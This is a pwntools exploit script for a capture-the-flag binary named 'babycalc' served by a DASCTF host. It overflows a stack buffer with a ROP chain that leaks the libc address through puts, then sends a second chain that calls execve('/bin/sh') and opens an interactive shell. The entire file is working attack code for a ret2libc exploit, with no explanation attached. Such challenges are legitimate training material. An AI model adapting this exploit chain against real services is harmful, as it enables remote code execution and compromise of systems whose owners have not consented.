from pwn import *

context.log_level = "debug"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./babycalc"
libc_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"
ld_path = "/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("tcp.cloud.dasctf.com", 28504)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


v = ['19', '36', '53', '70', '55', '66', '17', '161', '50', '131', '212', '101', '118', '199', '24', '3']

main = 0x400C1A
pop_rdi = 0x0000000000400ca3
pop_rsi = 0x0000000000400ca1
putsplt = elf.plt["puts"]
putsgot = elf.got["puts"]
ret = 0x400C19

pay = b"24".ljust(0x8, b"a")
pay += p64(ret) * (0x19 - 4)
pay += p64(pop_rdi) + p64(putsgot) + p64(putsplt) + p64(main)
pay += b"\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03" + b"b" * 0x1c + b"\x38\x00\x00\x00"
io.sendafter("number-1:", pay)

libc.address = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.symbols["puts"]
success("libcaddress -> " + hex(libc.address))
execve = libc.symbols["execve"]
success("execve -> " + hex(execve))

binsh = next(libc.search(b"/bin/sh\x00"))
success("binsh -> " + hex(binsh))

pop_rsi = roplibc.rsi.address + libc.address
pop_rdx = roplibc.rdx.address + libc.address

rop = p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(execve)
pay = b"24".ljust(0x8, b"a")
pay += p64(ret) * (0x19 - 7)
pay += rop
pay += b"\x13\x24\x35\x46\x37\x42\x11\xa1\x32\x83\xd4\x65\x76\xc7\x18\x03" + b"b" * 0x1c + b"\x38\x00\x00\x00"
io.sendafter("number-1:", pay)

io.interactive()
